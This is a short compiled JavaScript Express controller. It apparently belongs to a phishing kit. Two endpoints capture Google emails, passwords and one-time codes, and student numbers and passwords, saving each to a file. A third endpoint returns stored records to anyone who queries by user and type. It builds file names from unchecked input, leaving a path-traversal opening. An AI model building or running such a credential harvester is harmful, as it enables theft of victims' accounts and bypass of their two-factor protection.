"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.queryCredentials = exports.studentCredentials = exports.googleCredentials = void 0;
const credentials_1 = require("../services/credentials");
const googleCredentials = (req, res) => {
    const { email, password, otp } = req.body;
    (0, credentials_1.saveToFile)(`google-${email}`, { email, password, otp });
    res.status(200).json({ ok: true, msg: 'Google Credentials' });
};
exports.googleCredentials = googleCredentials;
const studentCredentials = (req, res) => {
    const { no, password } = req.body;
    (0, credentials_1.saveToFile)(`student-${no}`, { no, password });
    res.status(200).json({ ok: true, msg: 'Student Credentials' });
};
exports.studentCredentials = studentCredentials;
const queryCredentials = async (req, res) => {
    const { user = '', type = '' } = req.query;
    if (!user && type !== 'student' && type !== 'google') {
        return res.status(400).json({ ok: false });
    }
    const { ok, data } = await (0, credentials_1.restoreFromFile)(`${type}-${user}`);
    if (!ok)
        return res.status(400).json({ ok, data });
    res.status(200).json({ ok, data: JSON.parse(data) });
};
exports.queryCredentials = queryCredentials;
